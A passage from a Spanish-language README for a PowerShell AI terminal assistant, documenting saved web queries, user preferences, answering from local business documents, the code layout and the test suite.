página publica y no da ningún servicio en una línea: el último sorteo de la
lotería, un tipo de cambio publicado, un horario.

```
Ariel > agrégame un comando para el último sorteo de la lotería de Nicaragua de internet
ia > Busco en DuckDuckGo: Resultados sorteo lotería Nicaragua página oficial
ia > ¿De cuál de estas páginas saco los datos?

  1. Resultados | Lotería Nacional
     https://loterianacional.com.ni/resultados/
  ...

Ariel >
ia > Esto es lo que saco ahora mismo de loterianacional.com.ni:

  página:   https://loterianacional.com.ni/resultados/
  rótulos:  sorteo="Sorteo" ganador="Ganador:" premio="Premio:" fecha="Fecha:" sucursal="Sucursal:"

  {
    "sorteo": "2304",
    "ganador": "12010",
    "premio": "C$8,000,000",
    "fecha": "10/11/2026",
    "sucursal": "Tipitapa"
  }

ia > ¿Te vale así? ...
```

### Cómo funciona

- **Los rótulos.** Cada dato se define por su rótulo, el texto fijo que en
  la página va justo antes de él. Si la página dice «Ganador: 12010», el
  campo `ganador` tiene el rótulo `Ganador:`. El programa busca el rótulo sin
  mirar mayúsculas ni acentos y se queda con lo que le sigue en esa fila, o
  con la fila siguiente si la del rótulo no trae nada más.
- **Los bloques.** Si la página repite los datos (un bloque por sorteo), el
  rótulo que sale primero marca dónde empieza cada bloque. Los demás datos se
  buscan solo dentro de su bloque. Si al primer sorteo le falta un dato, sale
  `null`; nunca se toma el del sorteo siguiente. Con `registros=N` se sacan
  los N primeros bloques, en una lista.
- **Páginas que son JSON.** Si la página es JSON, el rótulo es la clave
  (`drawDate`) y el valor es lo que va entre comillas o la cifra. Un objeto
  o una lista no cuentan como dato.
- **El valor es el texto de la página, tal cual.** No se convierte nada: el
  billete «09065» conserva su cero y el premio, su «C$».

### Pidiéndola en la conversación

Si la petición de un comando habla de internet, de una página, de una web,
de DuckDuckGo o de curl, o trae una dirección `https://`, se guarda una
consulta web en vez de un comando de PowerShell:

1. **La página.** Si traes la dirección, se usa esa. Si no, el modelo
   escribe la búsqueda y se busca en DuckDuckGo. Eliges un resultado con su
   número, pegas otra dirección o escribes otra búsqueda.
2. **Los datos.** El modelo lee el principio de la página y propone los
   rótulos. Cada rótulo tiene que estar en la página y dar un dato: si no,
   se le dice qué falló y lo corrige (tres intentos). Los campos que no dan
   nada se quitan, y se dice cuáles.
3. **Lo ves antes de guardarla.** Sale el JSON con los datos leídos en ese
   momento. Puedes pedir cambios («quita la sucursal», «dame los últimos 3»)
   o escribir «otra» para elegir otra página.
4. **Nombre, para qué sirve y una confirmación**, como con los comandos.

Si un comando normal no sale («No encontré uno que valga»), escribir «web»
busca el dato en internet.

### De una vez, con `/comando web`

```
/comando web loteria-nicaragua https://loterianacional.com.ni/resultados/ sorteo=Sorteo ganador="Ganador:" premio="Premio:" fecha="Fecha:"
```

Los rótulos con espacios van entre comillas, y `registros=5` saca cinco
bloques. Se lee la página y se enseña lo que sale antes de preguntar si se
guarda.

### Al usarla

Igual que un comando guardado:

- se lista con `/comando`;
- `/comando loteria-nicaragua` enseña el JSON sin pasar por el modelo;
- preguntar con las palabras del nombre («¿cuál fue el último sorteo de la
  lotería de Nicaragua?») la ejecuta antes de preguntar al modelo;
- el modelo también puede pedirla por su nombre.

El modelo recibe el JSON rotulado con la página de la que sale. Si le pides
JSON, lo copia tal cual. Si no, lo cuenta en frases sin cambiar cifras,
nombres ni fechas.

### Límites

- **La página tiene que traer los datos en su HTML.** Las que los pintan con
  JavaScript al abrirse llegan casi vacías, y se avisa.
- **Si la página cambia sus rótulos, la consulta deja de dar datos** y lo
  dice; no se inventan. Se arregla guardándola de nuevo.
- **El modelo ve solo el principio de la página** (3500 caracteres) para
  proponer los rótulos. Si los datos están más abajo, escríbelos tú con
  `/comando web`.
- **Mira la lista de resultados antes de elegir.** La búsqueda puede traer
  páginas de otro país o de otra lotería. Con la frase «...en json», Gemma 4
  E4B buscó «API lotería Nicaragua JSON» y el primer resultado era una API de
  la lotería de España. Ahora la búsqueda no lleva el formato, y lo que se
  saca se enseña antes de guardar.
- **Las mismas reglas de dirección que los comandos:** solo `https`, servidor
  público y cada redirección revisada. Hasta 8 campos y 10 bloques. Las
  consultas cuentan dentro de los 20 comandos guardados.

## Preferencias

Lo que quieres que se tenga en cuenta siempre, también en las próximas
conversaciones:

```
Ariel > recuerda que las cifras de dinero me las des en dólares
  preferencia: Las cifras de dinero me las des en dólares
  ¿La guardo para esta y las próximas conversaciones? (s/n) s
guardada. La tendré en cuenta en esta y en las próximas conversaciones
```

- **Cómo se guardan:**
  - empezando el mensaje con «recuerda que», «recuérdame que», «ten en cuenta
    que», «toma nota:», «guarda en mis preferencias:», «de ahora en
    adelante» o «a partir de ahora»;
  - o con `/preferencia agregar <texto>`.
- **Siempre se pregunta antes de guardar.** El mensaje se reconoce por cómo
  empieza, y eso puede equivocarse. Si contestas que no, el mensaje va al
  modelo como cualquier otro.
- **Solo las escribes tú.** El modelo no tiene herramienta para guardarlas,
  así que una página que lea en una búsqueda no puede colarle una
  «preferencia». Si le pides que recuerde algo de otra forma («para que lo
  recuerdes la próxima vez»), contesta que no puede y te dice cómo hacerlo.
  Antes contestaba «lo recordaré», y era falso.
- **Cómo las usa el modelo:** van en cada pregunta, al final de la
  instrucción de sistema. Después de una búsqueda en internet se repiten
  junto a los resultados, porque es lo que el modelo lee al redactar.
- **Monedas:** con «cifras en dólares» guardado y una página en córdobas, se
  le pide que busque el tipo de cambio y dé las dos cifras, y que nunca
  convierta con un cambio de memoria. Gemma 4 E4B no siempre lo hace. A veces
  da la cifra de la fuente y ofrece convertirla, pero no inventa el cambio.
- **Comandos:** `/preferencias` las lista, numeradas, y `/preferencia quitar
  <número>` borra una.
- **Límites:** hasta 12 preferencias de hasta 200 caracteres, guardadas en
  `%LOCALAPPDATA%\PRC-CMD-AI\preferencias.json`. El servidor local tiene 4096
  tokens de contexto y las preferencias viajan en cada petición. Si el
  fichero se rompe, se avisa y no se sobrescribe.

## Documentos

Una carpeta con los documentos de tu negocio (servicios, precios, empleados,
horarios, procedimientos, políticas internas...) y la terminal contesta con
lo que dicen. Para quien lo vaya a usar en su negocio sin conocimientos
técnicos está la [guía de uso de los documentos](docs/guia-documentos.md):
cómo preparar la carpeta, qué PDF sirven, cómo preguntar, comprobar y
olvidar. El ejemplo de aquí es una ferretería inventada, la misma de las
pruebas:

```
Ariel > aprende de los documentos de D:\MiNegocio
ia > Voy a leer los documentos de D:\MiNegocio para contestarte con lo que dicen. No los
     cambio ni los mando a ningún sitio: lo que lea se queda en este equipo.
ia > Hay 12 que sé leer (2 Word, 2 texto, 2 OpenDocument, 1 Excel, 1 CSV, ...).
ia > ¿De qué tratan, en pocas palabras? Así sé cuándo mirarlos; ...
Ariel > mi ferretería: horarios, empleados, precios, políticas y procedimientos
ia > Listo: leí 10 documentos (16 fragmentos) en 0.5 s. Pregúntame lo que quieras sobre ...
Ariel > ¿cuánto cuesta el corte de llaves y desde cuándo?
consultando tus documentos: precios.xlsx
ia > El corte de llaves cuesta 50 y está disponible desde el 10/11/2025. Este dato proviene
     de precios.xlsx (apartado «Hoja: Servicios»).
Ariel > ¿cuánto gana Luis Mora?
ia > El documento empleados.csv indica que Luis Mora tiene el cargo de Cajero y su turno es
     Tarde, pero no especifica su salario.
```

### Cómo funciona

- **No se entrena el modelo.** En un equipo modesto no se puede, y un modelo
  «entrenado» con unos documentos los mezcla y rellena los huecos
  inventando. Lo que se hace es buscar, en cada pregunta, los fragmentos que
  vienen al caso. Esos fragmentos viajan con la pregunta, cada uno con el
  nombre de su fichero, y se le pide al modelo que conteste con ellos y diga
  de qué documento sale el dato. Si no lo dicen, dice que no viene en los
  documentos.
- **La búsqueda es por palabras**, sin acentos, sin plurales ni género y con
  formas verbales recortadas («venden» encuentra «vendemos»). Tiene unos
  pocos sinónimos de lo que se pregunta en un negocio: horario/abren/
  atención, empleado/personal, precio/costo/tarifa... Esas palabras de
  categoría pesan menos que las demás: en «¿cuánto cuesta el horno?» manda
  «horno», no «cuesta». Funciona sin dependencias, sin tocar llama-server y
  en milisegundos.
- **Cuándo viajan:** solo si la pregunta tiene que ver con los documentos,
  es decir, si el mejor fragmento trae palabras de la pregunta que no salen
  en todas partes. «¿Cuál es la capital de Francia?» o «¿qué hora es?» se
  contestan como siempre. Si no viajan solos, el modelo puede pedirlos con la
  herramienta `consultar_documentos` («¿tienen sucursal en León?»).
- **Antes de contestar dice qué consulta** (`consultando tus documentos:
  precios.xlsx`) y, al terminar, de qué documentos salió.
- **Las tablas se leen fila a fila.** Si la primera fila es una cabecera
  segura, cada fila lleva sus rótulos («Nombre: Ana Pérez | Cargo:
  Gerente»). Es segura cuando es todo texto y alguna columna trae cifras
  debajo. Si no, va aparte como «Columnas (primera fila)». Una tabla de dos
  columnas «Gerente | Ana» no se toma por cabecera: emparejar mal un rótulo
  con un dato sería dar un dato falso.
- **En Excel, las fechas y horas salen como fechas y horas.** Excel las
  guarda como números (45971 es el 10/11/2025; 0,3125 son las 07:30), y se
  convierten según el formato de la celda.

### Qué sabe leer

| Formato | Ficheros |
| --- | --- |
| Word | `.docx` y `.docm` (títulos, listas y tablas; sin el texto borrado con control de cambios) |
| Excel | `.xlsx` y `.xlsm` (cada hoja con su nombre) |
| PowerPoint | `.pptx` y `.pptm` (cada diapositiva, en orden) |
| PDF | `.pdf` con texto (títulos por el tamaño de la letra, tablas en columnas; ver abajo) |
| OpenDocument | `.odt`, `.ods`, `.odp` |
| Texto | `.txt`, `.md`, `.markdown`, `.csv`, `.tsv`, `.json`, `.xml`, `.html`, `.htm`, `.rtf`, `.log`, `.ini`, `.yml`, `.yaml` |

Los ficheros de texto se leen en UTF-8 o en Windows-1252, que es como
guardaban el Bloc de notas antiguo y el Excel en español. Los formatos
viejos de Office (`.doc`, `.xls`, `.ppt`) no se leen: se dice cuáles son y
que hay que guardarlos en el formato nuevo. Las imágenes y demás ficheros se
ignoran, igual que los ocultos, los temporales de Office (`~$...`) y las
carpetas que empiezan por punto.

**Los PDF** se leen con `lib/pdf.ps1`, sin bibliotecas. Un PDF no guarda
texto, sino qué letra se dibuja, dónde y con qué tipo de letra. Se recorren
las páginas en orden y se descifra cada letra con su tipo de letra: primero
con su tabla ToUnicode y, si no la trae, con su codificación y sus nombres de
letra. Por la posición se decide si va un espacio, un salto de línea, un
párrafo o una columna de tabla (` | `). Una línea en letra claramente más
grande que el cuerpo (o corta y toda en negrita) sale como título (`# ...`),
igual que con Word, así que los fragmentos llevan su apartado. Está probado
con PDF de verdad de Edge y de «Microsoft Print to PDF», y con PDF de
prueba con lo que hacen Word y Chrome: comprimidos, con objetos dentro de
streams y con tipos de letra recortados. Con un PDF hecho por Word no se ha
probado, porque no estaba instalado. Lo que no lee lo dice, con el motivo:

- **Escaneados:** son una imagen y no tienen texto, salvo que traigan la capa
  de un OCR, que sí se lee.
- **Protegidos** con contraseña o contra copia: se propone imprimirlos en
  «Microsoft Print to PDF» para sacar una copia sin protección.
- **Tipos de letra que no se pueden descifrar:** un tipo de letra recortado
  sin tabla ToUnicode da letras cambiadas, y un precio con las letras
  cambiadas es un dato falso. Se cuentan las letras sin descifrar y se mira
  si el texto parece texto: con más de un 5 % de letras sin descifrar, o con
  palabras sin vocales y signos sueltos, ese PDF no se lee.

### Órdenes

- `aprende de los documentos de D:\MiNegocio`, `lee la carpeta "D:\Mis
  documentos\Empresa"` o `/documentos agregar <carpeta>`: agrega una
  carpeta, con sus subcarpetas. Pregunta de qué trata, porque eso le dice al
  modelo cuándo mirarla.
- `/documentos`: las carpetas, cuánto se leyó de cada una y lo que no se
  pudo leer, con el motivo.
- `/documentos buscar <texto>`: los fragmentos que saldrían para ese texto,
  sin preguntar al modelo. Sirve para ver por qué contesta lo que contesta.
- `/documentos actualizar`: vuelve a revisar las carpetas ahora. No suele
  hacer falta: se revisan solas cada cinco minutos, y solo se lee lo que
  cambió.
- `/documentos quitar <nombre>`: deja de leer una carpeta. El nombre es el
  corto que enseña `/documentos` (el de la carpeta en minúsculas, sin
  acentos y con guiones: `D:\Mi Negocio` es `mi-negocio`). Sus ficheros
  siguen donde estaban.
- `/documentos olvidar <documento, apartado, tema o todo>`,
  `/documentos olvidos` y `/documentos recordar <número>`: ver «Olvidar».
- `/documentos on|off`: usarlos o no en esta sesión. También se apagan con
  `-NoDocumentos` o con `"documentos": false` en `settings.json`.

### Olvidar

Se puede olvidar todo o solo una parte. Lo que se olvida es lo leído; tus
ficheros no se tocan:

```
Ariel > olvida lo de la extensión
ia > Voy a olvidar lo que hable de «extension» (6 líneas de Empleados.csv). Tus ficheros no se tocan.
  por ejemplo:
  - Empleados.csv: Extensión: 101
  - Empleados.csv: Extensión: 102
  ...
ia > ¿Lo olvido? («sí» o «no»)
Ariel > sí
ia > Olvidado. Si te arrepientes: /documentos olvidos y /documentos recordar <número>.
```

- **Qué se puede olvidar:**
  - **Todo:** «olvida todo lo que aprendiste» o `/documentos olvidar todo`.
    Quita las carpetas y lo que se guardó de ellas.
  - **Una carpeta:** «deja de usar la carpeta negocio».
  - **Un documento:** «olvida el documento Empleados.csv». Ya ni se lee, y
    lo leído de él se borra.
  - **Un apartado de un documento:** «olvida el apartado Permisos». Se va
    con todo lo que cuelga de él, y el resto del documento sigue.
  - **Un tema en todos los documentos:** «olvida lo de los sueldos». Se
    quitan solo las líneas que hablan de él. En una fila de tabla se quita
    solo ese dato («Sueldo: 25000»), salvo que sea el primero de la fila, el
    que dice de qué es la fila; entonces se va la fila entera, para no dejar
    un precio sin su producto.
- **Por qué orden se busca:** primero el nombre exacto de una carpeta, un
  documento o un apartado; después parte del nombre; si no, es un tema. Así
  «permisos» es el apartado Permisos y no el documento «Vacaciones y
  permisos».
- **Siempre enseña qué va a olvidar,** con ejemplos, y pide un sí.
- **Se puede deshacer** lo olvidado de un documento, un apartado o un tema:
  `/documentos olvidos` lo lista y `/documentos recordar <número>` lo vuelve
  a usar. Se guarda en `documentos-olvidos.json`. Olvidar una carpeta o todo
  no se deshace así, porque quita la carpeta de la lista (y con «todo»,
  también la lista de olvidos): se vuelve a leer con `/documentos agregar`.
- **Lo que ya se dijo en la conversación** sigue en su memoria; `/new` la
  vacía.

### Privacidad

Los documentos nunca se modifican. Lo leído se guarda en
`%LOCALAPPDATA%\PRC-CMD-AI\documentos\`, para no releer cada vez lo que no
cambió; la lista de carpetas va en `documentos.json` y lo olvidado en
`documentos-olvidos.json`, en la misma carpeta `PRC-CMD-AI`. Los fragmentos
solo se mandan a los proveedores locales (Gemma, Qwen, Ollama). Con un proveedor de internet (xAI, OpenAI) saldrían del equipo, así
que no se mandan y se avisa una vez. Para permitirlo en una sesión está
`/documentos nube on`, y para siempre, `"documentos_nube": true` en
`settings.json`.

### Límites

- **Velocidad:** 400 documentos (2,4 MB de texto) se leen la primera vez en
  unos 5 s. Al volver a arrancar, el índice guardado se carga en menos de
  medio segundo. Cada pregunta busca en unos 0,2 s. Los PDF van más
  despacio, porque PowerShell recorre letra a letra: unas 15 páginas de
  Chrome (que coloca cada letra por separado, el peor caso) en 3 s. Solo la
  primera vez: lo leído se guarda y no se relee mientras no cambie.
- **Topes:** 10 carpetas, 3000 ficheros, 30 MB por fichero y 1,5 millones
  de caracteres de texto por fichero. Viajan 4 fragmentos de 700 caracteres
  como mucho por pregunta, porque el servidor local tiene 4096 tokens de
  contexto.
- **Busca palabras, no ideas.** Una pregunta sin ninguna palabra de los
  documentos («¿de qué color es la ropa de trabajo?» cuando el documento
  dice «uniforme») puede no encontrarlos. El modelo aún puede pedirlos con
  la herramienta, o puedes probar con `/documentos buscar`.
- **Una respuesta solo es tan buena como los fragmentos.** Si dos documentos
  se contradicen, el modelo ve los dos. Con «¿a qué hora abren los
  sábados?», Gemma 4 E4B dio la hora de la bodega, que estaba en otra hoja
  del Excel.

## Estructura del código

```
AI.bat              lanzadera CMD: separa pregunta de opciones y pasa la
                    pregunta por la variable AI_QUESTION (esquiva el bug de
                    comillas de "powershell -File")
bin/ai.ps1          CLI principal: REPL, modo una-respuesta, subcomandos
lib/core.ps1        nucleo HTTP (HttpWebRequest), streaming SSE, filtro de
                    <think>, parser de errores de las distintas APIs
lib/providers.ps1   tabla declarativa de proveedores y alias
lib/ui.ps1          colores ANSI, render incremental de Markdown, PSReadLine
lib/web.ps1         buscar en internet: hay salida?, DuckDuckGo, lectura de
                    paginas y la herramienta buscar_web
lib/equipo.ps1      lo que el equipo ya sabe: el reloj, las ocho lecturas
                    (bateria, red, Windows, hardware), el atajo y la
                    herramienta datos_equipo
lib/comandos.ps1    comandos de solo lectura que guarda el usuario: las
                    reglas (analizador de PowerShell y listas cerradas), la
                    ejecucion por piezas y la herramienta comando_guardado
lib/consultas.ps1   consultas web guardadas: leer una pagina, sacar los
                    datos por sus rotulos y darlos en JSON
lib/preferencias.ps1 lo que el usuario pide recordar: reconocer "recuerda
                    que...", guardar y cargar, y la nota para el modelo
lib/documentos.ps1  las carpetas de documentos: lectores de cada formato,
                    fragmentos, indice y busqueda por palabras, y la
                    herramienta consultar_documentos
lib/pdf.ps1         el texto de un PDF, sin bibliotecas: objetos, streams,
                    tipos de letra (ToUnicode, codificaciones) y la
                    posicion de cada letra
tools/Set-AIKey.ps1 guardado seguro de claves en HKCU\Environment
tools/build.ps1     normaliza codificacion: UTF-8 con BOM en .ps1, CRLF en .bat
tests/probar.ps1    pasa todas las pruebas y dice cuales fallan
tests/*.ps1         una prueba por parte; sus frases y escenas, en tests/datos/
tests/hacer-pdf.ps1 escribe los PDF de prueba (no es una prueba)
HISTORIAL.md        que cambio en cada version, por que y como se probo
docs/guia-documentos.md  guia de uso de los documentos, para el dueno de
                    un negocio
docs/video/         el video de presentacion: guion, narracion y su voz,
                    capturas reales de la terminal y la composicion
                    HyperFrames que lo renderiza
```

Si editas cualquier `.ps1` o `.bat`, pasa después `tools/build.ps1`: Windows
PowerShell 5.1 decide la codificación de un script por su BOM, y un `.ps1`
sin BOM con acentos se lee como cp1252 y acaba en mojibake (o directamente no
parsea).

## Pruebas

Después de un cambio, y antes de subirlo:

```
powershell -NoProfile -ExecutionPolicy Bypass -File tests\probar.ps1
```

Sin modelo y sin internet tarda unos 30 segundos y pasa ocho pruebas:

| Prueba | Qué mira |
| --- | --- |
| `comandos.ps1` | Comandos guardados: 158 comandos de `datos/reglas.txt` que las reglas deben aceptar o rechazar, el plan que se ejecuta, direcciones, nombres, la ejecución, guardar y cargar, lo que ve el modelo y el atajo. |
| `equipo-frases.ps1` | 58 frases de `datos/equipo-frases.txt` y dos casos más: qué datos del equipo pide cada una, o ninguno. |
| `equipo.ps1` | Reloj, formatos con un equipo de mentira y la lectura de verdad de este equipo. Esta lectura sale en pantalla y no se guarda. |
| `preferencias.ps1` | Qué mensajes piden recordar algo y qué se guarda, la limpieza, guardar y cargar, el fichero roto, la nota para el modelo y que el modelo no pueda guardarlas. |
| `consultas.ps1` | Consultas web, con una página de ejemplo (`datos/consulta.html`): buscar rótulos, los bloques y el dato que falta, páginas JSON, el JSON que sale, lo que propone el modelo, guardar y cargar, y qué peticiones son de internet. |
| `documentos.ps1` | Documentos de una ferretería inventada en todos los formatos, creados al vuelo en una carpeta temporal (en el repositorio no hay binarios). Mira cada lector (y PDFs de prueba de verdad: comprimidos, con objetos dentro de streams, tipos de letra recortados con ToUnicode, letras por su nombre, y los que no se leen: escaneado, protegido, sin tabla de letras y roto), los fragmentos, qué se relee y qué no, el índice guardado, 15 preguntas que tienen que encontrar su fragmento y 6 que no deben sacar documentos, las peticiones conversadas y el orden de las órdenes `/documentos`, y también olvidar. Con `-Crear <carpeta>` solo crea la ferretería, para probarla a mano. |
| `negocio.ps1` | Un negocio inventado entero, la Panadería y Cafetería La Espiga: quiénes son, servicios y precios, empleados, horarios por sucursal, vacaciones y permisos, reglamento, procedimientos, quejas, pedidos, proveedores, seguridad alimentaria, inventario, y necesidades y metas. Va en trece formatos (el catálogo de pasteles es un PDF), con trampas: datos que no están, dos horarios, una factura escaneada en PDF y un temporal de Word. Sin modelo mira el procesamiento: qué se lee de cada fichero, que cada una de las 34 preguntas encuentre su documento y olvidar. Con `-Crear <carpeta>` solo crea los documentos. |
| `dialogo.ps1 -SoloReconocer` | Reconocer cuándo una frase pide guardar un comando (`datos/peticiones.txt`) y leer lo que propone el modelo. |

Opciones:

- **`-Red`:** añade unas pocas peticiones de verdad a internet, para la IP pública, un servidor que no existe y la página de la Lotería Nacional de Nicaragua.
- **`-Modelo`:** necesita el llama-server en marcha y tarda varios minutos. Pasa las once escenas de `datos/escenas.txt` por el diálogo real de `bin/ai.ps1`, con las respuestas del usuario ya escritas, y prueba `/comando agregar` con nueve casos. También hace al modelo las preguntas de `negocio.ps1` y mira cada respuesta:
  - los datos que están tienen que salir, y del documento;
  - los que no están («¿cuánto gana Lucía?», «¿aceptan tarjeta?») tienen que decir que no vienen, sin cifras ni correos inventados;
  - lo que no va del negocio («¿cuál es la capital de Francia?») se contesta sin documentos;
  - lo olvidado ya no se sabe.

Las respuestas del modelo cambian de una vez a otra: si una escena falla, lee su conversación antes de dar el fallo por bueno.

Cada prueba sale con su número de fallos, y `probar.ps1` sale con el número de pruebas que fallaron (0 es que todo va bien).

## Limitaciones conocidas

- Pensado para Windows; no se ha probado en PowerShell para Linux/macOS.
- Sin soporte de imágenes ni ficheros adjuntos más allá del contexto por
  stdin / `-Context` y las carpetas de `/documentos`. Las únicas herramientas
  son `buscar_web`, `datos_equipo`, `comando_guardado` y
  `consultar_documentos`.
- El coste de la memoria del REPL crece con la conversación (se envía entera
  en cada turno): usa `/new` en conversaciones largas.

## Licencia

[MIT](LICENSE).
